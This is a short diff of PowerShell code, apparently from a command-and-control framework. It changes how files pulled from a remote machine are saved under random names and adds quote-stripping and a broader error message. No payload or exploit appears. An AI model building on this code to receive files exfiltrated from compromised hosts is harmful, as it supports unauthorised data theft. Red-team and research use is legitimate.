@@ -1124,6 +1124,7 @@ $message =[Convert]::ToBase64String($Bytes)
             {
                 try {
                 $file = split-path $cookieplaintext -leaf
+                $file = $file -replace "'", ""
                 $file = $file.split('\.')[-1]
                 $ramdomfileext = Get-RandomURI -Length 15
                 $targetfile = "$global:newdir\$ramdomfileext.$file"   
@@ -1133,7 +1134,7 @@ $message =[Convert]::ToBase64String($Bytes)
                 write-host "Downloaded file: $targetfile" -ForegroundColor Green
 
                 } catch {
-                Write-Host "File not downloaded, the size could be too large!" -ForegroundColor Red
+                Write-Host "File not downloaded, the size could be too large or the user may not have permissions!" -ForegroundColor Red
                 }
                 $backToPlainText = "Downloaded file: $targetfile 123456<>654321"
             }
